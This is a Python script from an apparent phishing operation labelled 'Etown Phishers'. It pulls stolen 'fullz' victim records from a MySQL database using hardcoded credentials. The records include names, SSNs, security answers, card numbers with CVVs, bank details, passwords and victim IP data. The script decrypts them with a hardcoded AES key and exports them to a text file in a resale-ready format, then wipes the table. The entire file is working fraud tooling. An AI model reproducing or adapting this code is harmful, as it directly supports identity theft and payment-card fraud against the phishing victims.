import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import mysql.connector

conn = mysql.connector.connect(host='localhost', database='bin', user='binbot', password='F00tbal!!')
query_conn = conn.cursor(buffered=True)

__key__ = hashlib.sha256(b'bin-bot-encrypt!').digest()
def encrypt(raw):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

    raw = base64.b64encode(pad(raw).encode('utf8'))
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key= __key__, mode= AES.MODE_CFB,iv= iv)
    return base64.b64encode(iv + cipher.encrypt(raw))

def decrypt(enc):
    unpad = lambda s: s[:-ord(s[-1:])]

    enc = base64.b64decode(enc)
    iv = enc[:AES.block_size]
    cipher = AES.new(__key__, AES.MODE_CFB, iv)
    return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('utf8'))

def get_available_fullz():
    result_text = ""
    sample_text = "+ ------------- Etown Phishers -------------+\n+ ------------------------------------------+\n+ Personal Information\n| id: %s\n%s%s%s%s%s%s%s%s%s+ ------------------------------------------+\n+ Billing Information\n%s%s%s%s%s%s%s%s+ ------------------------------------------+\n+ Account Information\n%s%s+ ------------------------------------------+\n+ Victim Information\n%s%s%s%s%s+ ------------------------------------------+\n\n"
    query = "select full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip_address, location, user_agent, browser, platform, id from fullz where 1"
    query_conn.execute(query)
    f_list = query_conn.fetchall()
    for f in f_list:
        result_text += sample_text % (
            f[24],
            decrypt(f[0]), decrypt(f[1]), decrypt(f[2]), decrypt(f[3]), decrypt(f[4]), decrypt(f[5]), decrypt(f[6]),
            decrypt(f[7]), decrypt(f[8]), decrypt(f[9]), decrypt(f[10]), decrypt(f[11]), decrypt(f[12]), decrypt(f[13]),
            decrypt(f[14]), decrypt(f[15]), decrypt(f[16]), decrypt(f[17]), decrypt(f[18]), decrypt(f[19]),
            decrypt(f[20]),
            decrypt(f[21]), decrypt(f[22]), decrypt(f[23]))
    with open("fullz_available.txt", "w") as fullz_file:
        fullz_file.write(result_text)


get_available_fullz()

query_conn.execute("delete from fullz")
conn.commit()

print("Fullz export are finished!")